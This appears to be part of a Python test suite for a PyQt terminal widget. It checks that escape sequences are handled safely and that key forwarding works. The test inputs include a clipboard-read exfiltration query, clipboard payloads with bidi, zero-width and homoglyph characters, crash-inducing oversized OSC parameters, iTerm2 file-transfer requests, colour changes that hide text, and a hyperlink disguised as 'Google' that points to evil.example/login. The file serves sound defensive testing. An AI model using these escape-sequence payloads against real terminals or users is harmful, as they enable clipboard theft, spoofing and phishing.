    tui._write = lambda d: _tui_spy.append(bytes(d))
    tui._handle_osc(b'\x1b]52;c;?\x07')                     # read query
    ok(not any(b'\x1b]52;c;' in _w for _w in _tui_spy),
       'an OSC 52 read query is DECLINED (never answered -- no exfiltration)')
    tui._write = _orig_tui_write
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'a\x1b[31mb\x00c') + b'\x07')
    ok(_QGA2.clipboard().text() == 'a[31mbc',
       'a clipboard write is stripped of escape/control bytes')
    # the write filter is isprintable()-based like the paste path: a bidi override,
    # a zero-width character and a C1 control are dropped, so a program cannot
    # smuggle a look-alike or hidden character onto the SYSTEM clipboard (which a
    # later paste into any application would otherwise carry).
    _hostile = ('git' + chr(0x202E) + ' config' + chr(0x200B)
                + chr(0x85)).encode('utf-8')
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(_hostile) + b'\x07')
    ok(_QGA2.clipboard().text() == 'git config',
       'OSC 52 write drops bidi/zero-width/C1, like the paste sanitizer')
    # ASCII-only for the untrusted program-driven write (unlike the user's own,
    # reviewed copy): a homoglyph must not ride onto the system clipboard to
    # deceive a later paste into another application.
    _homo = ('p' + chr(0x0430) + 'ypal.com').encode('utf-8')   # Cyrillic a look-alike
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(_homo) + b'\x07')
    ok(_QGA2.clipboard().text() == 'pypal.com',
       'OSC 52 write is ASCII-only: a homoglyph is dropped (no clipboard deception)')
    # a huge OSC numeric parameter must not crash the app -- int() raises on a
    # 4300+-digit string (Python 3.11+), and these parsers run in a Qt notifier
    # slot, so an unhandled exception would abort the whole application.
    # osc_colors (NOT osc_palette, which is not a real apply_osc flag) must be ON so the
    # OSC 4 palette-index int() path is actually REACHED -- with the wrong flag it hit the
    # disabled early-return and the crash test proved nothing. Reset it after, so the later
    # "ignored until osc_colors is on" test still starts from off.
    for _ofl in ('osc_title', 'osc_colors'):
        tui.apply_osc(_ofl, True)
    tui._handle_osc(b'\x1b]' + b'9' * 5000 + b';x\x07')          # huge OSC code
    tui._handle_osc(b'\x1b]4;' + b'1' * 5000 + b';rgb:ff/00/00\x07')  # huge palette index
    ok(isinstance(tui.toPlainText(), str),
       'a 5000-digit OSC code / palette index does not crash the TUI OSC handlers')
    tui.apply_osc('osc_colors', False)
    tui.apply_osc('osc_title', False)
    # cwd OSC 7 gated + emits the safe path
    _cwds: list[str] = []
    tui.cwd_changed.connect(_cwds.append)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')        # osc_cwd off
    ok(_cwds == [], 'OSC 7 cwd is ignored until osc_cwd is enabled')
    tui.apply_osc('osc_cwd', True)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')
    ok(_cwds == ['/home/u/p'], 'enabled: OSC 7 reports the unquoted path')
    # a MALFORMED file:// with an authority but NO path ('file://host') must not smuggle
    # the host in as the path ('/host'): urlparse().path is empty, so the bare host is
    # not reported as a cwd. The old url[7:].split('/',1)[-1] took the authority as path.
    _cwds.clear(); tui._reported_cwd = ''
    tui._handle_osc(b'\x1b]7;file://justhost\x07')
    ok('/justhost' not in _cwds,
       'OSC 7: a malformed file://host (no path) does not report the host as the cwd')
    # #6: a long cwd path must show up to 4096 chars in the tab tooltip, not be cut to 80.
    # sanitize_title's default limit is 80, so the old trailing [:4096] slice was dead -- the
    # bound is now passed to the sanitizer.
    _cwds.clear()
    tui._reported_cwd = ''
    tui._handle_osc(b'\x1b]7;file://h/' + b'd' * 300 + b'\x07')
    ok(_cwds and len(_cwds[-1]) > 80,
       '#6: a long OSC 7 cwd path is bounded at 4096, not truncated to the sanitize_title '
       'default of 80 (got %d)' % (len(_cwds[-1]) if _cwds else -1))
    # iTerm2 OSC 1337 has NO toggle: file transfer from untrusted output is
    # indefensible, so it can never be enabled and is always neutralized
    # (recognized, dropped, never leaked). It is not even a registered feature.
    ok('osc_iterm2' not in {_f[0] for _f in _S.OSC_FEATURES},
       'iTerm2 (OSC 1337) is not a toggleable OSC feature -- it cannot be enabled')
    _QGA2.clipboard().setText('UNTOUCHED')
    _t0, _n0, _c0 = len(titles), len(notes), len(_cwds)
    for _osc1337 in (b'\x1b]1337;File=name=eA==;size=1:eA==\x07',   # inline file
                     b'\x1b]1337;SetUserVar=k=dg==\x07',            # shell variable
                     b'\x1b]1337;RequestUpload=format=tgz\x07'):    # file transfer
        tui._handle_osc(_osc1337)
    ok(len(titles) == _t0 and len(notes) == _n0 and len(_cwds) == _c0
       and _QGA2.clipboard().text() == 'UNTOUCHED',
       'OSC 1337 is always neutralized: no signal, no clipboard, no cwd, no toggle')
    # palette OSC 4/10/11: gated, and a program CANNOT hide text by moving fg==bg
    class _MiniCell:                                        # a default-coloured cell
        fg = bg = 'default'
        bold = reverse = underscore = False
        data = ' '
    tui._handle_osc(b'\x1b]11;#123456\x07')                 # osc_colors OFF
    ok(tui._osc_palette == {}, 'OSC palette change is ignored until osc_colors is on')
    tui.apply_osc('osc_colors', True)
    tui._handle_osc(b'\x1b]10;#000000\x07\x1b]11;#000000\x07')   # hide attempt fg==bg
    _hidfg = tui._pyte_format(_MiniCell()).foreground().color().name()
    ok(_hidfg != '#000000',
       'fg==bg (via OSC 10/11) cannot hide text: the guard forces a readable colour')
    tui._fmt_cache.clear()
    tui._handle_osc(b'\x1b]10;#33cc99\x07')                 # a legit fg is applied
    ok(tui._pyte_format(_MiniCell()).foreground().color().name() == '#33cc99',
       'a legitimate OSC 10 foreground colour is applied')
    tui.apply_osc('osc_colors', False)
    ok(tui._osc_palette == {}, 'disabling osc_colors reverts to the theme palette')
    # a flood of palette changes is bounded: _osc_color must not render per change
    # (the timer coalesces), so this returns promptly and applies the last value.
    tui.apply_osc('osc_colors', True)
    tui._handle_osc(b''.join(b'\x1b]4;2;#%02x0000\x07' % (_i % 256)
                             for _i in range(300)))
    ok(tui._osc_palette.get(2) is not None,
       'a burst of OSC 4 palette changes is applied without per-change rendering')
    tui.apply_osc('osc_colors', False)
    # hyperlink OSC 8: gated, and surfaces the REAL target next to the visible text
    # (a link's display text can differ from where it points -- the phishing risk).
    _links: list[str] = []
    tui.notified.connect(_links.append)
    tui._handle_osc(b'\x1b]8;;https://evil.example\x07Google\x1b]8;;\x07')
    ok(_links == [], 'OSC 8 hyperlinks are ignored until osc_hyperlink is enabled')
    tui.apply_osc('osc_hyperlink', True)
    tui._handle_osc(b'\x1b]8;;https://evil.example/login\x07Google\x1b]8;;\x07')
    ok(_links and 'Google' in _links[-1] and 'evil.example/login' in _links[-1],
       'a hyperlink surfaces the real target next to the display text')
    tui.shutdown()
    # mode switch is renderer-only: NO shell restart, the running program and its
    # frame survive. A program writes a full-screen frame to stdout in line mode;
    # flipping to TUI must show the frame without the pid changing. (The frame
    # goes to stdout, not through the line-discipline echo, so the raw escapes
    # reach the read path.)
    if tui_available():
        # a real program that writes a full-screen frame to stdout, then idles so
        # the child stays alive for the pid check (a temp script avoids the shell
        # quoting/escaping that a -c string would suffer through shlex).
        _script = os.path.join(tempfile.mkdtemp(prefix='st-frame-'), 'frame.sh')
        with open(_script, 'w') as _f:
            _f.write('#!/bin/sh\n'
                     'printf "HIST_LINE\\n"\n'
                     'printf "\\033[?1049h\\033[2J\\033[HFRAME_XYZ\\n"\n'
                     'sleep 30\n')
        os.chmod(_script, 0o700)
        sw = SecureTerminal(command=_script)
        _adv: list[str] = []
        sw.advise_signal.connect(_adv.append)   # advisories are EMITTED, not injected
        sw.resize(700, 300)
        sw.show()
        pump(300)
        _pid = sw._pid
        ok(sw._alt_screen, 'alt-screen tracked in line mode')
        ok(sw._tui_hint_shown and any('TUI' in a for a in _adv),
           'advisory emitted (not injected into the document) for a full-screen app')
        ok('[secure-terminal]' not in sw.toPlainText(),
           'the advisory is not injected into the terminal, so it cannot be copied')
        sw.apply_tui(True)
        pump(50)
        eq(sw._pid, _pid, 'mode switch does NOT restart the shell (same pid)')
        ok('FRAME_XYZ' in sw.toPlainText(), 'running frame survives the switch to TUI')
        sw.apply_tui(False)
        pump(30)
        eq(sw._pid, _pid, 'switching back does not restart either')
        ok('HIST_LINE' in sw.toPlainText(), 'line scrollback restored on the way back')
        sw.shutdown()
else:
    # already recorded as a FAIL above; do not silently pass
    sys.stderr.write('secure-terminal-tests(widget): FAIL pyte absent, TUI-mode '
                     'assertions could not run\n')

# line mode forwards the cursor/history keys to the shell's line editor: Up/Down
# recall history, Left/Right/Home/End/Delete edit -- the arrow-up regression.
ak = SecureTerminal(command='/bin/cat')
asent = spy_writes(ak)
key(ak, Qt.Key.Key_Up)
key(ak, Qt.Key.Key_Down)
key(ak, Qt.Key.Key_Left)
key(ak, Qt.Key.Key_Right)
key(ak, Qt.Key.Key_Home)
key(ak, Qt.Key.Key_End)
key(ak, Qt.Key.Key_Delete)
eq(asent, [b'\x1b[A', b'\x1b[B', b'\x1b[D', b'\x1b[C', b'\x1b[H', b'\x1b[F', b'\x1b[3~'],
   'line mode forwards arrows/Home/End/Delete to the shell')

# default tab label is the working-directory basename, not a static "shell":
# "~" for home, else the directory name. The child forks in our cwd.
cw = SecureTerminal(command='/bin/cat')
_cwd = os.getcwd()
_expect = '~' if _cwd == os.path.expanduser('~') else (os.path.basename(_cwd) or '/')
eq(cw.cwd_basename(), _expect, 'cwd_basename matches the shell working directory')

# hovering a reveal <U+XXXX> badge shows a tooltip explaining the code point.
from PyQt6.QtWidgets import QToolTip                    # noqa: E402
from PyQt6.QtGui import QHelpEvent                      # noqa: E402
tt = SecureTerminal(command='/bin/cat')
tt.resize(700, 300)
tt.show()
tt.apply_mode('reveal')
tt._append('x' + chr(0x20AC))                 # euro renders as the <U+20AC> badge
pump(20)
_i = tt.toPlainText().index('<U+20AC>') + 3
_c = tt.textCursor()
_c.setPosition(_i)
_rect = tt.cursorRect(_c)
_vp = _rect.center()
_hv = QHelpEvent(QEvent.Type.ToolTip, _vp, tt.viewport().mapToGlobal(_vp))
tt.event(_hv)
pump(20)
ok(QToolTip.isVisible() and 'EURO SIGN' in QToolTip.text(),
   'hovering a reveal badge shows the code-point tooltip')
QToolTip.hideText()


finish('widget')
